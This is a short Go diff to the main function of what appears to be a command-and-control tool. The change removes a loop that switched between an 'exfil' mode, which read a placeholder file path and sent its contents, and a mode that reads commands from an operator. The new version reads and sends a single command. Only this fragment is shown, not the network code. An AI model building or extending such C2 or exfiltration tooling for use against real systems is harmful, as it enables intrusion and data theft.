@@ -170,20 +170,11 @@ func begin_comm(dat *[]byte, bp *int, mode *string) {
 
 func main() {
 	var baseline int
-	var dat []byte
 	var mode string = "c2"
 
-	for {
-		if mode == "exfil" {
-			dat = setup_exfil("/PATH/TO/FILE/FILE_NAME.TXT")
-			begin_comm(&dat, &baseline, &mode)
-		} else {
-			var command string
-			fmt.Print("Enter your command: ")
-			fmt.Scan(&command)
-			command_bytes := []byte(command)
-			begin_comm(&command_bytes, &baseline, &mode)
-		}
-	}
-
+	var command string
+	fmt.Print("Enter your command: ")
+	fmt.Scan(&command)
+	command_bytes := []byte(command)
+	begin_comm(&command_bytes, &baseline, &mode)
 }
